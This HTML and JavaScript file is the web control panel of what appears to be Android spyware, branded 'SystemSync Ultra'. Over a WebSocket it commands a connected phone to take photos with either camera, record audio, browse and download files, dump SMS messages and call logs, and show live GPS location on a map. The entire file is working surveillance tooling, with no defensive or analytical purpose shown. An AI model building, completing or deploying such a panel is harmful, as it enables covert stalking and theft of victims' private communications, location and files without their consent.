<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SystemSync Ultra Console</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <style>
        body { margin:0; background:#050505; color:#e0e0e0; font-family:sans-serif; display:flex; flex-direction:column; height:100vh; overflow:hidden; }
        .header { height:60px; background:#000; border-bottom:1px solid #111; display:flex; align-items:center; justify-content:space-between; padding:0 25px; }
        .status-badge { padding:6px 14px; border-radius:4px; font-weight:bold; }
        .online { background:#063b13; color:#69f0ae; }
        .offline { background:#3b0606; color:#ff8a80; }
        .main { flex:1; display:flex; }
        .panel { width:300px; background:#0d0d0d; border-right:1px solid #111; padding:20px; overflow-y:auto; }
        .section { margin-bottom:25px; }
        .section h3 { font-size:12px; color:#555; text-transform:uppercase; letter-spacing:1px; border-bottom:1px solid #1a1a1a; padding-bottom:5px; }
        button { width:100%; padding:10px; margin-bottom:8px; border:1px solid #222; border-radius:4px; background:#151515; color:#ccc; cursor:pointer; text-align:left; }
        button:hover { background:#1f1f1f; border-color:#00d2ff; color:#fff; }
        .viewer { flex:1; display:flex; align-items:center; justify-content:center; background:#080808; }
        .phone { width:360px; height:700px; border-radius:30px; background:#000; border:10px solid #1a1a1a; display:flex; flex-direction:column; overflow:hidden; position:relative; }
        .phone-header { padding:15px; background:#0a0a0a; border-bottom:1px solid #1a1a1a; text-align:center; color:#00d2ff; font-weight:bold; }
        .phone-content { flex:1; overflow-y:auto; padding:15px; }
        .data-card { background:#111; padding:10px; margin-bottom:10px; border-radius:5px; border-left:4px solid #00d2ff; }
        #map { height:100%; width:100%; border-radius:10px; }
    </style>
</head>
<body>

<div class="header">
    <div style="color:#00d2ff; font-weight:bold;">SYSTEMSYNC ULTRA</div>
    <div class="status-badge offline" id="connectionStatus">DEVICE OFFLINE</div>
</div>

<div class="main">
    <div class="panel">
        <div class="section">
            <h3>Surveillance</h3>
            <button onclick="sendCommand('camFront')">üì∏ Front Camera</button>
            <button onclick="sendCommand('camBack')">üì∏ Back Camera</button>
            <button onclick="sendCommand('startAudio')">üé§ Start Audio</button>
            <button onclick="sendCommand('stopAudio')">üõë Stop Audio</button>
        </div>
        <div class="section">
            <h3>Files & Data</h3>
            <button onclick="sendCommand('ls root')">üìÇ File Explorer</button>
            <button onclick="sendCommand('getSMS inbox')">üí¨ Inbox SMS</button>
            <button onclick="sendCommand('getCallLogs')">üìû Call Logs</button>
        </div>
        <div class="section">
            <h3>Tracking</h3>
            <button onclick="sendCommand('getLocation')">üìç Live GPS</button>
        </div>
    </div>

    <div class="viewer">
        <div class="phone">
            <div class="phone-header" id="outputHeader">Console Ready</div>
            <div class="phone-content" id="outputContent">
                <div style="text-align:center; color:#333; margin-top:50%;">Awaiting connection...</div>
            </div>
        </div>
    </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
    const ws = new WebSocket("wss://" + window.location.host);
    let mapInstance = null;

    ws.onopen = () => ws.send("I_AM_WEB");

    ws.onmessage = (event) => {
        const msg = event.data;
        if (msg.startsWith("STATUS:")) {
            const status = msg.split(":")[1];
            const badge = document.getElementById('connectionStatus');
            badge.className = (status === 'ONLINE') ? 'status-badge online' : 'status-badge offline';
            badge.innerText = "DEVICE " + status;
        } 
        else if (msg.startsWith("SMS_DATA:")) renderList("SMS", JSON.parse(msg.substring(9)));
        else if (msg.startsWith("CALL_DATA:")) renderList("Calls", JSON.parse(msg.substring(10)));
        else if (msg.startsWith("FILE_LIST:")) renderFiles(JSON.parse(msg.substring(10)));
        else if (msg.startsWith("LOC_DATA:")) renderLocation(JSON.parse(msg.substring(9)));
        else if (msg.startsWith("FILE_DATA:")) downloadBase64(msg.substring(10));
    };

    function sendCommand(cmd) {
        ws.send(cmd);
        document.getElementById('outputContent').innerHTML = "<div style='text-align:center; padding:20px;'>Syncing...</div>";
    }

    function renderList(type, data) {
        document.getElementById('outputHeader').innerText = type + " Log";
        const container = document.getElementById('outputContent');
        container.innerHTML = "";
        data.forEach(item => {
            const card = document.createElement('div');
            card.className = "data-card";
            card.innerHTML = Object.keys(item).map(k => `<div><small style="color:#555">${k.toUpperCase()}:</small> ${item[k]}</div>`).join("");
            container.appendChild(card);
        });
    }

    function renderFiles(data) {
        document.getElementById('outputHeader').innerText = "File Explorer";
        const container = document.getElementById('outputContent');
        container.innerHTML = "";
        data.forEach(file => {
            const card = document.createElement('div');
            card.className = "data-card";
            card.innerHTML = `
                <div>${file.isDir ? 'üìÅ' : 'üìÑ'} <b>${file.name}</b></div>
                <button style="width:auto; font-size:10px; margin-top:5px;" onclick="sendCommand('${file.isDir ? 'ls ' : 'dl '}${file.path}')">
                    ${file.isDir ? 'Open' : 'Download'}
                </button>`;
            container.appendChild(card);
        });
    }

    function renderLocation(data) {
        document.getElementById('outputHeader').innerText = "GPS Location";
        const container = document.getElementById('outputContent');
        container.innerHTML = "<div id='map'></div>";
        if (data.error) { container.innerHTML = `<div style="color:red">${data.error}</div>`; return; }
        
        setTimeout(() => {
            if (mapInstance) mapInstance.remove();
            mapInstance = L.map('map').setView([data.lat, data.lon], 15);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
            L.marker([data.lat, data.lon]).addTo(mapInstance);
        }, 200);
    }

    function downloadBase64(base64) {
        const link = document.createElement('a');
        link.href = "data:application/octet-stream;base64," + base64;
        link.download = "downloaded_file";
        link.click();
    }
</script>
</body>
</html>
